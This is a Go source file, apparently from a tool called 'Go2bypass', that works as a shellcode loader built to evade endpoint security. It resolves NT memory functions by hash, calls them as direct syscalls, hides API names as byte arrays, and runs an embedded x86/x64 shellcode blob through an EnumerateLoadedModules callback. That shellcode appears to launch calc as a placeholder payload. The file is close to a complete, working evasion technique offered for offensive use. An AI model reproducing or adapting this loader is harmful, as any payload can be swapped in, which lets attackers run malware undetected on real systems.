package main

import (
	Go2gabh "Go2bypass/Doge-Gabh/Gabh"
	Go2public "Go2bypass/Public"
	_ "embed"
	"fmt"
	"syscall"
	"unsafe"
)

var ApiDe Go2public.ApiEDcrypt
var CodeEnContent Go2public.CodToshellKey

func main() {

	sc := []byte{
		0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
		0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
		0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
		0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
		0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
		0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
		0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
		0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
		0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
		0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
		0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
		0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
		0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
		0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
		0xd7,
	}
	enumerateLoadedModules, _, _ := Go2gabh.DiskFuncPtr(string([]byte{'d', 'b', 'g', 'h', 'e', 'l', 'p', '.', 'd', 'l', 'l'}), "5e3838876713a569270ff10834c178c349a41518", Go2public.Str2sha1)
	alloc, e := Go2gabh.GetSSNByNameExcept(Go2public.Str2sha1(string([]byte{'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'})), Go2public.Str2sha1)
	if e != nil {
		panic(e)
	}
	protect, e := Go2gabh.GetSSNByNameExcept(Go2public.Sha256Hex(string([]byte{'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'})), Go2public.Sha256Hex)
	if e != nil {
		panic(e)
	}
	const (
		mt = uintptr(0x00001000)
		me = uintptr(0x00002000)
	)

	var handle = uintptr(0xffffffffffffffff)
	var baseA uintptr
	regionsize := uintptr(len(sc))
	r1, r := Go2gabh.HgSyscall(
		uint16(alloc), //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(mt|me),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		return
	}
	Go2public.Cpymem(baseA, sc)

	var oldprotect uintptr
	r1, r = Go2gabh.HgSyscall(
		uint16(protect), //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}

	handle1, _ := syscall.GetCurrentProcess()
	syscall.Syscall(uintptr(enumerateLoadedModules), 3, uintptr(handle1), baseA, 0)

}
